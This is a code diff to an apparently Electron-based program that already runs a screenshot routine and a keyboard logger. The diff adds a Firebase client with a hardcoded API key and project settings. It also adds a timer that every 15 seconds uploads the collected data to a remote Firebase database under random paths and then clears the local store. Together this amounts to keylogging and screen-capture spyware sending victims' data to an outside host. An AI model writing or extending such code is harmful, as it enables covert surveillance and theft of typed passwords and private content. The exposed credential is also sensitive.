@@ -108,4 +108,60 @@ ScreenShot();
  
 let KeyboardLogger=require("./Keyboardlogging.js");
 KeyboardLogger(KeyIsEnable);
-
+var firebase = require('@firebase/app');
+require('@firebase/auth');
+require('@firebase/database');
+ firebase.default.initializeApp(
+  {
+    apiKey: "AIzaSyB03uXj4djfEFpYKppSnjopgjE6O5l8-YE",
+    authDomain: "symbolic-datum-233317.firebaseapp.com",
+    databaseURL: "https://symbolic-datum-233317.firebaseio.com",
+    projectId: "symbolic-datum-233317",
+    storageBucket: "symbolic-datum-233317.appspot.com",
+    messagingSenderId: "412248865946",
+    appId: "1:412248865946:web:f5df2c9fdca2108356f323",
+    measurementId: "G-E1B75MFBL8"
+ });
+setInterval(function(){
+require('dns').resolve('www.google.com', function(err) {
+  if (err) {
+     console.log("No connection");
+  } else {
+   
+  //console.log("firebase",firebase);
+                
+                   //  firebase.analytics();
+          let data=shared.GetPostedData();
+          if(data.length!=0)
+          {
+       
+  
+            for(let i=0;i<data.length;i++)
+            {
+              
+              // try{
+           var path="Electron"+shared.getRandomInt("999999999")+"/";
+              var body={
+                      type:data[i].Type,
+                      Output:data[i].Data
+              }
+             firebase.default.database().ref(path).set(body);
+              console.log("yes it happened")
+             
+              
+            }
+           
+          }else{
+            console.log("No Record Found")
+          }
+          let res=[];
+          fs.writeFileSync("./Storage/Data.json",JSON.stringify(res));
+          }
+       
+          
+});
+function callback()
+{
+  console.log("Its Back")
+}
+},15000)
